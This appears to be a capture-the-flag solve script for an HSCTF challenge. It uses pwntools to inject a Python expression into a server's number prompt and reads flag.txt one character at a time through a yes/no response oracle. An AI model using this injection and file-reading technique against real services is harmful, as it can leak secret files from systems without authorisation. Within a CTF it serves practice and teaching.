from pwn import *
from string import printable

flag="flag{"

while "}" not in flag:
	for i in printable:
		p=remote("misc.hsctf.com",7001)
		p.recvuntil("First number:")
		payload='"'+flag+i+'"'+' in open("flag.txt").read()'
		p.sendline(payload)
		p.recvuntil("Second number:")
		p.sendline("2")
		p.recvuntil(":")
		p.sendline("a")
		res=p.recvall()
		if "3" in res:
			flag=flag+i
		p.close()
print(flag)
